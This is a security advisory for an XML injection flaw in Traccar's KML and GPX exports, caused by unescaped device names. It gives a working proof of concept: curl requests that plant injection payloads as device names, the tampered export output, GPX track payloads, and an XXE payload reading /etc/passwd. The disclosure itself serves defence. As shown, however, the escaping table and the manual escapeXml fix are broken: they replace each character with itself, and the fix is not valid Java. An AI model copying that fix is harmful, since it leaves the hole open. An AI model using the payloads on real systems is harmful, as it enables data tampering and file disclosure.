        XML Injection in KML/GPX Export via Unescaped Device Names
      

    

    

        

          
  Moderate

        

      

          tananaev
          published
          GHSA-32pj-vrqc-x656
          May 5, 2026

      
    
  

    

    

      

  
    

  

      

  

        

  

      
Package

    

        
          

        
      org.traccar:traccar        
            (Maven)
        
    
  

  

      
Affected versions

      
>= 6.11.1
  

  

      
Patched versions

      
6.13.0
  

  

    

  

  
Description

  

    
Summary

An XML injection vulnerability exists in the KML and GPX export functionality. Device names are inserted directly into XML output without proper XML entity encoding. An attacker can inject arbitrary XML content by creating a device with a malicious name, which corrupts the exported file structure and can inject malicious content that affects other users who download and open these exports.

Details

Vulnerability: KmlExportProvider.java - Unescaped Device Name in XML

The KML export provider writes device names directly into XML without any encoding.

Vulnerable Code (src/main/java/org/traccar/reports/KmlExportProvider.java, lines 55-57):

writer.print("<name>");
writer.print(device.getName());  // NO XML ESCAPING - VULNERABLE
writer.print("</name>");

Vulnerability: GpxExportProvider.java - Unescaped Device Name in XML

The GPX export provider has the identical vulnerability.

Vulnerable Code (src/main/java/org/traccar/reports/GpxExportProvider.java, lines 52-54):

writer.print("<name>");
writer.print(device.getName());  // NO XML ESCAPING - VULNERABLE
writer.print("</name>");

Special XML characters that should be escaped:

< → <

> → >

& → &

" → "

' → '

PoC

Prerequisites:

Two user accounts (User A - attacker, User B - victim)

User A and User B share device access (via group permissions or User B is manager/admin)

Exploit Steps:

Step 1: Login as User A (attacker) and create a device with XML injection payload:

curl -b cookie.txt -X POST "http://<host>/api/devices" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "</name></Document><Document><name>INJECTED BY ATTACKER</name><description>This device data has been manipulated!</description><Placemark><name>Fake Location</name><Point><coordinates>0,0,0</coordinates></Point></Placemark></Document><Document><name>",
    "uniqueId": "xml-injection-device-001"
  }'

Step 2: User B (victim) exports KML data for shared devices or the attacker's device:

curl -b cookie.txt "http://<host>/api/positions/kml?deviceId=<device_id>&from=2026-01-01T00:00:00Z&to=2026-12-31T23:59:59Z" -o export.kml

Step 3: The exported KML file contains injected XML structure:

<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
<Document>
<name></name></Document><Document><name>INJECTED BY ATTACKER</name>
<description>This device data has been manipulated!</description>
<Placemark><name>Fake Location</name><Point><coordinates>0,0,0</coordinates></Point></Placemark>
</Document><Document><name></name>
<Placemark>
...

Expected Result:

The XML structure is corrupted/manipulated

Attacker can inject fake placemarks, descriptions, and data

When opened in Google Earth or other KML viewers, fake data is displayed

Additional Payloads:

Simple XML Breaking:

Device name: <>&"'

Results in malformed XML that fails to parse.

KML Content Injection:

</name><description>HACKED - Your data is compromised!</description><name>

GPX Track Injection:

</name></trk><trk><name>Fake Track</name><trkseg><trkpt lat="0" lon="0"><ele>0</ele></trkpt></trkseg></trk><trk><name>

XXE Attempt (if parser is vulnerable):

</name><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><name>&xxe;

Impact

Severity: Medium (CVSS 5.4)

This vulnerability allows:

Data Manipulation: Attacker can inject fake GPS coordinates, routes, and location data into exported files.

Content Spoofing: Injected descriptions and names can spread misinformation or malicious content.

Export File Corruption: Malformed XML breaks the export functionality, causing denial of service for export features.

Cross-User Attack: When managers/admins export data that includes attacker's devices, they receive corrupted/manipulated files.

Potential XXE: If the exported files are processed by vulnerable XML parsers, XXE attacks may be possible.

Attack Scenarios:

Fleet Data Manipulation: In a logistics company, a malicious driver creates a device with XML injection payload. When the fleet manager exports route data for compliance reporting, the exported KML/GPX contains fake routes and manipulated data.

Evidence Tampering: GPS tracking data exported for legal/insurance purposes could be manipulated to show false locations or routes.

Denial of Service: Corrupted exports prevent legitimate use of the export functionality.

Suggested Fix

Option 1: Use XML Escaping Utility (Recommended)

Use Apache Commons Text or similar library:

import org.apache.commons.text.StringEscapeUtils;

writer.print("<name>");
writer.print(StringEscapeUtils.escapeXml11(device.getName()));
writer.print("</name>");

Option 2: Manual XML Escaping

Create a utility method:

private String escapeXml(String input) {
    if (input == null) return "";
    return input
        .replace("&", "&")
        .replace("<", "<")
        .replace(">", ">")
        .replace("\"", """)
        .replace("'", "'");
}

// Usage:
writer.print("<name>");
writer.print(escapeXml(device.getName()));
writer.print("</name>");

Option 3: Use XML Library with Auto-Escaping

Use JAXB, DOM, or other XML libraries that handle escaping automatically:

DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.newDocument();

Element name = doc.createElement("name");
name.setTextContent(device.getName()); // Auto-escaped

Option 4: Input Validation

Reject device names containing XML special characters:

public void setName(String name) {
    if (name != null && name.matches(".*[<>&\"'].*")) {
        throw new IllegalArgumentException("Name contains invalid characters");
    }
    this.name = name;
}
